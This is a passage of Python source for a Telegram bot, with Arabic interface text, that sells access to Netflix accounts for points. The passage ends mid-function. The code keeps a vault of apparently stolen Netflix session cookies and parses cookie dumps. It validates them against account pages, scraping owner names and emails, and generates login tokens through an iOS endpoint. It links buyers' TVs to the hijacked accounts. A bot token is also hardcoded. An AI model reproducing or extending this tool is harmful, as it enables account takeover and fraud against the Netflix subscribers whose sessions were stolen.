# ============================================================
# MR NETFLIX BOT v2 — Paid + Points + Referral
# ============================================================

import sys
import types

_fake_ap = types.ModuleType("apscheduler")
_fake_sch = types.ModuleType("apscheduler.schedulers")
_fake_asy = types.ModuleType("apscheduler.schedulers.asyncio")
_fake_trg = types.ModuleType("apscheduler.triggers")
_fake_itv = types.ModuleType("apscheduler.triggers.interval")


class _NullSched:
    def __init__(self, *a, **k): pass
    def __getattr__(self, _): return lambda *a, **k: None
    def add_job(self, *a, **k): return None
    def remove_job(self, *a, **k): return None
    def get_jobs(self, *a, **k): return []
    def start(self, *a, **k): pass
    def shutdown(self, *a, **k): pass


_fake_asy.AsyncIOScheduler = _NullSched
_fake_asy.BackgroundScheduler = _NullSched
_fake_sch.asyncio = _fake_asy
_fake_ap.schedulers = _fake_sch
sys.modules["apscheduler"] = _fake_ap
sys.modules["apscheduler.schedulers"] = _fake_sch
sys.modules["apscheduler.schedulers.asyncio"] = _fake_asy
sys.modules["apscheduler.triggers"] = _fake_trg
sys.modules["apscheduler.triggers.interval"] = _fake_itv

import os, re, json, logging, requests, io, zipfile, hashlib, tempfile
import time, asyncio, codecs, html as html_mod, random, string, threading
from collections import defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ============================================================
# CONFIG — غيّر هنا
# ============================================================
BOT_TOKEN = "9021933468:AAEHgQARV9BXglnxYnk1_o_kmxtTvQebD74"       # ← @BotFather
OWNER_ID = 8743212779                        # ← تأكد
CHANNEL_ID = "@mar_netflix"                  # ← قناة الإشعارات
TECH_USERNAME = "@BR_Go_16"                  # ← الفني (للتواصل)
STORE_NAME = "MR NETFLIX"
SUPPORT_USERNAME = "@BR_Go_16"

# أسعار
DEFAULT_ACCOUNT_PRICE = 100                  # نقاط
DEFAULT_MARKET_PRICE = 500                   # د.ج
TOPUP_STARS = 15                             # نجمة
TOPUP_POINTS = 15                            # نقاط
REFERRAL_POINTS = 1                          # نقطة لكل إحالة

# ============================================================
# FILES
# ============================================================
COOKIES_DIR = "vault"
USERS_FILE = "users.json"
TOPOPS_FILE = "pending_topups.json"
DYN_ADMINS_FILE = "dyn_admins.json"
CONFIG_FILE = "config.json"
SALES_DIR = "sales"

os.makedirs(COOKIES_DIR, exist_ok=True)
os.makedirs(SALES_DIR, exist_ok=True)

MAX_WORKERS = 20
BATCH_SIZE = 10
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

# ============================================================
# NFTOKEN (من الكود الأصلي)
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"kidsBillboardEnabled":"true","billboardEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.client.type": "argo",
    "accept-language": "en-US;q=1",
}

# ============================================================
# LOCKS
# ============================================================
cookie_lock = threading.Lock()
users_lock = threading.Lock()
topups_lock = threading.Lock()
tv_stats_lock = threading.Lock()
_config_lock = threading.Lock()
_admins_lock = threading.Lock()

tv_stats = {
    "total_logins": 0, "successful": 0, "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

user_state = {}
user_executors = {}

# ============================================================
# LOAD/SAVE — JSON helpers
# ============================================================
def _load_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ============================================================
# USERS
# ============================================================
def load_users():
    return _load_json(USERS_FILE, {})


def save_users(u):
    with users_lock:
        _save_json(USERS_FILE, u)


def get_user(uid):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        users[uid] = {
            "points": 0,
            "referrer": None,
            "purchases": [],
            "username": None,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        save_users(users)
    return users[uid]


def set_user(uid, data):
    uid = str(uid)
    users = load_users()
    users[uid] = data
    save_users(users)


def add_points(uid, amount):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        users[uid] = {
            "points": 0, "referrer": None, "purchases": [],
            "username": None,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
    users[uid]["points"] = users[uid].get("points", 0) + amount
    save_users(users)
    return users[uid]["points"]


def remove_points(uid, amount):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        return 0
    users[uid]["points"] = max(0, users[uid].get("points", 0) - amount)
    save_users(users)
    return users[uid]["points"]


def get_user_points(uid):
    return get_user(uid).get("points", 0)


# ============================================================
# CONFIG (السعر)
# ============================================================
def load_config():
    with _config_lock:
        if not os.path.exists(CONFIG_FILE):
            cfg = {
                "account_price": DEFAULT_ACCOUNT_PRICE,
                "market_price": DEFAULT_MARKET_PRICE,
                "topup_stars": TOPUP_STARS,
                "topup_points": TOPUP_POINTS,
                "referral_points": REFERRAL_POINTS,
            }
            _save_json(CONFIG_FILE, cfg)
            return cfg
        return _load_json(CONFIG_FILE, {})


def save_config(cfg):
    with _config_lock:
        _save_json(CONFIG_FILE, cfg)


def get_account_price():
    return load_config().get("account_price", DEFAULT_ACCOUNT_PRICE)


def get_market_price():
    return load_config().get("market_price", DEFAULT_MARKET_PRICE)


def set_account_price(p):
    cfg = load_config()
    cfg["account_price"] = int(p)
    save_config(cfg)


def set_market_price(p):
    cfg = load_config()
    cfg["market_price"] = int(p)
    save_config(cfg)


# ============================================================
# ADMINS
# ============================================================
def load_dyn_admins():
    return _load_json(DYN_ADMINS_FILE, [])


def save_dyn_admins(lst):
    with _admins_lock:
        _save_json(DYN_ADMINS_FILE, lst)


dyn_admins = load_dyn_admins()


def is_admin(uid):
    return uid == OWNER_ID or uid in dyn_admins


# ============================================================
# PENDING TOPUPS
# ============================================================
def load_topups():
    return _load_json(TOPOPS_FILE, {})


def save_topups(t):
    with topups_lock:
        _save_json(TOPOPS_FILE, t)


def has_pending_topup(uid):
    t = load_topups()
    return str(uid) in t


def create_topup(uid, username=None):
    t = load_topups()
    t[str(uid)] = {
        "user_id": uid,
        "username": username,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "pending",
    }
    save_topups(t)


def approve_topup(uid, points):
    t = load_topups()
    entry = t.pop(str(uid), None)
    save_topups(t)
    if entry:
        add_points(uid, points)
        return True
    return False


def reject_topup(uid):
    t = load_topups()
    entry = t.pop(str(uid), None)
    save_topups(t)
    return bool(entry)


# ============================================================
# COOKIE HELPERS
# ============================================================
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)


def clean_unicode(val):
    if not isinstance(val, str): return val
    try: val = codecs.decode(val, 'unicode_escape')
    except Exception: pass
    try: val = html_mod.unescape(val)
    except Exception: pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
    return val


def safe_html(text):
    if not text: return "Unknown"
    text = clean_unicode(str(text))
    return text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')


def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)


NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent",
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}


def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"): return entries
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except Exception:
        pass
    if entries.get("NetflixId"): return entries
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m: entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None


def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cd = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cd.get('NetflixId'):
                    results.append(("json_block", cd))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    m = {}
                    for c in obj["cookies"]:
                        if isinstance(c, dict) and "name" in c and "value" in c:
                            if c["name"] in NETFLIX_COOKIE_NAMES:
                                m[c["name"]] = c["value"]
                    if m.get('NetflixId'):
                        results.append(("json_cookies", m))
            elif isinstance(obj, list):
                m = {}
                for c in obj:
                    if isinstance(c, dict):
                        n = c.get("name") or c.get("key")
                        v = c.get("value")
                        if n and v and n in NETFLIX_COOKIE_NAMES:
                            m[n] = v
                if m.get('NetflixId'):
                    results.append(("json_list", m))
    except Exception:
        pass
    netscape = []
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"): continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in NETFLIX_COOKIE_NAMES:
            netscape.append({"name": parts[5], "value": parts[6]})
    if netscape:
        nf_ids = [(i, e) for i, e in enumerate(netscape) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in nf_ids:
            cs = {"NetflixId": nf_entry["value"]}
            for e in netscape:
                if e["name"] != "NetflixId": cs[e["name"]] = e["value"]
            results.append((f"netscape_{nf_idx}", cs))
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES: sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))
    nf_matches = re.findall(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE)
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m: cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))
    return results


async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir(): continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'): continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (bn, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        continue
    return cookies


def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml',
               'Accept-Language': 'en-US,en;q=0.9'}
    try:
        urls = ['https://www.netflix.com/YourAccount', 'https://www.netflix.com/account']
        resp = None; txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=15, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r; txt = r.text; break
            except Exception:
                continue
        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': 'conn fail', 'cookie': cookie_dict}
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'login redirect', 'cookie': cookie_dict}

        def find(p):
            m = re.search(p, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        ms = None
        m = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if m: ms = m.group(1)
        has_data = any([name, email, country, plan, ms])
        if not has_data:
            return {'ok': False, 'reason': 'no data', 'cookie': cookie_dict}
        return {
            'ok': True,
            'premium': ms == 'CURRENT_MEMBER',
            'name': name or 'Unknown',
            'email': email or 'Unknown',
            'country': country or 'Unknown',
            'plan': plan or 'Unknown',
            'membership_status': ms or 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e)[:30], 'cookie': cookie_dict}


def generate_nftoken(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={cookie_dict['NetflixId']}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS,
                         headers=headers, timeout=8, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token: return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry}, None
    except Exception as e:
        return None, str(e)[:30]


# ============================================================
# VAULT
# ============================================================
def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR): return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]


def count_vault_cookies():
    return len(get_vault_cookies())


def save_cookie_to_vault(name, cookie_dict):
    os.makedirs(COOKIES_DIR, exist_ok=True)
    base = safe_filename(name)
    dest = os.path.join(COOKIES_DIR, base + ".txt")
    if os.path.exists(dest):
        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        dest = os.path.join(COOKIES_DIR, f"{base}_{suf}.txt")
    try:
        with open(dest, 'w', encoding='utf-8') as f:
            f.write(dict_to_netscape(cookie_dict))
        return True
    except Exception:
        return False


def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files: return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except Exception:
            return None, None


# ============================================================
# TV LOGIN
# ============================================================
def validate_cookie_tv(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html",
               "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers,
                        proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or 'signin' in r.url.lower(): return False, None, None
        if r.status_code != 200: return False, None, None
        country = None; plan = "Unknown"
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
        if not m: m = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if m: country = m.group(1)
        m = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        if not m: m = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
        if m: plan = m.group(1)
        has_account = 'Account' in r.text or 'membershipStatus' in r.text
        return has_account and country is not None, country, plan
    except Exception:
        return False, None, None


def extract_auth_url(html_text):
    for p in [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
              r'authURL=([^&\s"\']+)', r'value="(c1\.[^"]+)"']:
        m = re.search(p, html_text)
        if m: return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None


def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html",
               "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200: return {"success": False, "error": "TV page down"}
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    auth_url = extract_auth_url(r.text)
    if not auth_url: return {"success": False, "error": "no auth url"}
    post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://www.netflix.com/tv8",
                    "Origin": "https://www.netflix.com"}
    form = {"flow": "websiteSignUp", "authURL": auth_url,
            "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2",
            "code": tv_code, "tvLoginRendezvousCode": tv_code,
            "action": "nextAction"}
    try:
        r = session.post(url, data=form, headers=post_headers, proxies=proxy,
                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    if "/tv/out/success" in r.url.lower(): return {"success": True, "error": None}
    text = str.lower(re.sub(r'\s+', ' ', html_mod.unescape(re.sub(r'<[^>]+>', ' ', r.text))))
    for p in [r"your tv is ready", r"successfully activated"]:
        if re.search(p, text): return {"success": True, "error": None}
    for p in [r"that code wasn'?t right",
              r"code (is )?(incorrect|invalid|wrong|expired)"]:
        if re.search(p, text): return {"success": False, "error": "Invalid code"}
    return {"success": False, "error": "unknown"}


def process_tv_login(tv_code):
    """يحاول تفعيل TV — يرجع dict {success, country, plan, error, attempts}"""
    max_attempts = min(100, max(count_vault_cookies() * 2, 30))
    attempts = 0
    tried = []
    while attempts < max_attempts:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename:
            return {"success": False, "error": "no_cookies_left",
                    "tried_countries": tried}
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'):
            continue
        valid, country, plan = validate_cookie_tv(cookies)
        if not valid:
            continue
        if country: tried.append(country)
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code)
        result["country"] = country
        result["plan"] = plan
        result["tried_countries"] = tried
        if result["success"]:
            return result
        if "Invalid" in str(result.get("error", "")):
            return result
    return {"success": False, "error": "all_failed", "tried_countries": tried}


# ============================================================
# NOTIFICATIONS
# ============================================================
async def notify_channel(context, text):
    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID, text=text, parse_mode="HTML"
        )
    except Exception as e:
        log.warning("channel notify failed: %s", e)


# ============================================================
# MARKUPS
# ============================================================
def get_main_markup(uid):
    rows = [
        [InlineKeyboardButton("🛒 شراء حساب", callback_data="buy")],
        [InlineKeyboardButton("💰 شحن رصيد", callback_data="topup")],
        [InlineKeyboardButton("🎁 رابط الإحالة", callback_data="ref_link")],
        [InlineKeyboardButton("📦 مشترياتي", callback_data="my_purchases")],
        [InlineKeyboardButton("👤 حسابي", callback_data="my_account")],
        [InlineKeyboardButton("📞 الدعم", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)


def buy_type_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 تفعيل هاتف (روابط)", callback_data="buy_phone")],
        [InlineKeyboardButton("📺 تفعيل شاشة TV (كود)", callback_data="buy_tv")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
    ])


def admin_markup():
    rows = [
        [InlineKeyboardButton("🔍 فحص كومبو", callback_data="admin_check")],
        [InlineKeyboardButton("🗑️ حذف كوكيزات", callback_data="admin_clear")],
        [InlineKeyboardButton("💵 تغيير السعر (نقاط)", callback_data="admin_set_price")],
        [InlineKeyboardButton("💰 تغيير سعر السوق", callback_data="admin_set_market")],
        [InlineKeyboardButton("➕ إضافة نقاط", callback_data="admin_add_points")],
        [InlineKeyboardButton("➖ خصم نقاط", callback_data="admin_remove_points")],
        [InlineKeyboardButton("👥 رفع أدمن", callback_data="admin_promote")],
        [InlineKeyboardButton("📉 تنزيل أدمن", callback_data="admin_demote")],
        [InlineKeyboardButton("💳 طلبات الشحن", callback_data="admin_topups")],
        [InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
    ]
    return InlineKeyboardMarkup(rows)


STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 إيقاف", callback_data="stop_check")]
])

BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]


async def animate_message(ctx, chat_id, msg_id, stop_event, label="Searching vault..."):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=f"{f} {label}"
            )
        except Exception:
            pass
        idx += 1
        await asyncio.sleep(0.3)


# ============================================================
# /start — with referral
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    username = msg.from_user.username
    args = context.args or []

    new_user = not os.path.exists(USERS_FILE) or str(uid) not in load_users()

    user = get_user(uid)
    if username:
        user["username"] = username
        set_user(uid, user)

    # إحالة
    if new_user and args and args[0].startswith("ref_"):
        try:
            ref_uid = int(args[0][4:])
            if ref_uid != uid:
                users = load_users()
                if str(ref_uid) in users:
                    users[str(ref_uid)]["points"] = users[str(ref_uid)].get("points", 0) + REFERRAL_POINTS
                    save_users(users)
                    user["referrer"] = ref_uid
                    set_user(uid, user)

                    # أشعر القناة
                    await notify_channel(context,
                        f"🎁 <b>إحالة جديدة</b>\n"
                        f"👤 صديق جديد: <code>{uid}</code>\n"
                        f"🎯 المحيل: <code>{ref_uid}</code>\n"
                        f"➕ +{REFERRAL_POINTS} نقطة\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    # أشعر المحيل
                    try:
                        await context.bot.send_message(
                            ref_uid,
                            f"🎁 <b>إحالة جديدة!</b>\n\n"
                            f"👤 صديقك سجل: <code>{uid}</code>\n"
                            f"➕ +{REFERRAL_POINTS} نقطة",
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass
        except Exception:
            pass

    user_state[uid] = {"mode": "idle"}
    price = get_account_price()
    market = get_market_price()
    points = user.get("points", 0)

    await msg.reply_html(
        f"<b>🎬 {STORE_NAME}</b>\n\n"
        f"👤 <b>مرحبا بك!</b>\n"
        f"💰 <b>رصيدك:</b> {points} نقطة\n"
        f"🏷️ <b>سعر الحساب:</b> {price} نقطة (~{market} د.ج)\n\n"
        f"اختر من الأزرار:",
        reply_markup=get_main_markup(uid)
    )


# ============================================================
# BACK / MENU
# ============================================================
async def back_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user_state[uid] = {"mode": "idle"}

    user = get_user(uid)
    price = get_account_price()
    market = get_market_price()

    txt = (
        f"<b>🎬 {STORE_NAME}</b>\n\n"
        f"💰 <b>رصيدك:</b> {user.get('points',0)} نقطة\n"
        f"🏷️ <b>سعر الحساب:</b> {price} نقطة (~{market} د.ج)\n\n"
        f"اختر من الأزرار:"
    )
    try:
        await q.edit_message_text(txt, parse_mode="HTML",
                                  reply_markup=get_main_markup(uid))
    except Exception:
        await context.bot.send_message(q.message.chat_id, txt,
                                       parse_mode="HTML",
                                       reply_markup=get_main_markup(uid))


# ============================================================
# ACCOUNT / REF LINK
# ============================================================
async def my_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    user = get_user(uid)
    users = load_users()
    referrals = sum(1 for k, v in users.items() if v.get("referrer") == uid)

    txt = (
        f"👤 <b>حسابي</b>\n\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"💰 <b>النقاط:</b> {user.get('points',0)}\n"
        f"🎁 <b>الإحالات:</b> {referrals}\n"
        f"📦 <b>المشتريات:</b> {len(user.get('purchases', []))}\n"
        f"📅 <b>تاريخ الانضمام:</b> {user.get('joined_at','—')}"
    )
    await q.edit_message_text(txt, parse_mode="HTML",
                              reply_markup=InlineKeyboardMarkup([
                                  [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
                              ]))


async def ref_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    bot_username = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_username}?start=ref_{uid}"

    txt = (
        f"🎁 <b>رابط الإحالة</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"💰 كل صديق يدخل من رابطك = <b>+{REFERRAL_POINTS} نقطة</b>"
    )
    await q.edit_message_text(txt, parse_mode="HTML",
                              reply_markup=InlineKeyboardMarkup([
                                  [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
                              ]))


# ============================================================
# TOPUP
# ============================================================
async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    if has_pending_topup(uid):
        await q.edit_message_text(
            "⏳ <b>عندك طلب شحن قيد المراجعة</b>\n\n"
            f"تواصل مع {TECH_USERNAME} للاستفسار.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📞 تواصل", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
            ]))
        return

    cfg = load_config()
    stars = cfg.get("topup_stars", TOPUP_STARS)
    points = cfg.get("topup_points", TOPUP_POINTS)

    txt = (
        f"💰 <b>شحن الرصيد</b>\n\n"
        f"⭐ المطلوب: <b>{stars} نجمة</b>\n"
        f"➕ تحصل على: <b>{points} نقطة</b>\n\n"
        f"<b>خطوات الشحن:</b>\n"
        f"1. تواصل مع {TECH_USERNAME}\n"
        f"2. ادفع {stars} نجمة\n"
        f"3. اضغط زر \"تم الدفع\"\n"
        f"4. الأدمن يضيف النقاط\n\n"
        f"📌 سعر الحساب: <b>{get_account_price()} نقطة</b>"
    )
    await q.edit_message_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 تواصل مع الفني", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
            [InlineKeyboardButton("✅ تم الدفع — أرسل الطلب", callback_data="topup_submit")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
        ]))


async def topup_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    username = q.from_user.username
    await q.answer()

    if has_pending_topup(uid):
        await q.edit_message_text("⏳ عندك طلب معلق بالفعل.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))
        return

    create_topup(uid, username)
    cfg = load_config()
    stars = cfg.get("topup_stars", TOPUP_STARS)

    await q.edit_message_text(
        "✅ <b>تم إرسال طلب الشحن</b>\n\n"
